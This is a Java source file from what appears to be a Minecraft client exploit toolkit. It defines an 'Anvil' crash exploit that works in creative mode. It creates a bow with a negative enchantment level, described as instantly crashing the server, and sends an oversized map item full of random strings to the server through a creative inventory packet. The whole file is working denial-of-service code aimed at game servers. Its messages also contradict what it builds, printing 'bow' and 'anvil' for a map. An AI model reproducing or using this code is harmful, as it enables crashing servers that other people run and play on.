package dev.isnow.puppy.exploit.impl.creative;

import dev.isnow.puppy.exception.ExploitException;
import dev.isnow.puppy.exploit.Exploit;
import dev.isnow.puppy.exploit.ExploitInfo;
import dev.isnow.puppy.exploit.ExploitType;
import dev.isnow.puppy.helper.ChatHelper;
import dev.isnow.puppy.helper.NetHelper;
import net.minecraft.enchantment.Enchantment;
import net.minecraft.init.Items;
import net.minecraft.item.ItemMap;
import net.minecraft.item.ItemStack;
import net.minecraft.network.play.client.C10PacketCreativeInventoryAction;
import org.apache.commons.lang3.RandomStringUtils;

import java.util.ArrayList;

@ExploitInfo(
    name = "Anvil",
    type = ExploitType.CREATIVE,
    description = "After attacking a spider with this bow, server insta crashes."
)
public class AnvilExploit extends Exploit<ItemStack> {

  public AnvilExploit() {
    super(() -> {
      ItemStack itemStack = new ItemStack(Items.bow);
      itemStack.addEnchantment(Enchantment.baneOfArthropods, -1);
//      ItemStack itemStack = new ItemStack(Blocks.anvil);
//      itemStack.setItemDamage(1337);
//      itemStack.setRepairCost(1337);
//
//      for (Enchantment enchantment : Enchantment.enchantmentsList) {
//        if (enchantment != null) {
//          itemStack.addEnchantment(enchantment, 1);
//        }
//      }

      itemStack.setStackDisplayName("funny bow");
      return itemStack;
    });
  }

  @Override
  public void execute(Object... args) {
    if (!mc.thePlayer.capabilities.isCreativeMode) {
      throw new ExploitException("This exploit will only work on creative.");
    }

    for (int i = 0; i < 9; i++) {
      if (mc.thePlayer.inventory.getStackInSlot(i) == null) {
        ItemStack itemStack = new ItemStack(Items.map);
        ItemMap map = (ItemMap) itemStack.getItem();
        ArrayList<String> xd = new ArrayList<>();
        for(int j = 0; j < 256; j++) {
          xd.add(RandomStringUtils.randomAlphabetic(100));
        }
        map.addInformation(itemStack, mc.thePlayer, xd, true);
        map.createMapDataPacket(itemStack, mc.theWorld, mc.thePlayer);

        itemStack.setStackDisplayName("Thicc MAP");

//      ItemStack itemStack = new ItemStack(Blocks.anvil);
//      itemStack.setItemDamage(1337);
//      itemStack.setRepairCost(1337);
//
//      for (Enchantment enchantment : Enchantment.enchantmentsList) {
//        if (enchantment != null) {
//          itemStack.addEnchantment(enchantment, 1);
//        }
//      }

//        itemStack.setStackDisplayName("funny bow");
        NetHelper.sendPacket(new C10PacketCreativeInventoryAction(36, itemStack));
        mc.thePlayer.closeScreen();
        ChatHelper.printMessage("Added bow to your inventory.");
        return;
      }
    }

    throw new ExploitException("Can't add anvil to your inventory.");
  }
}
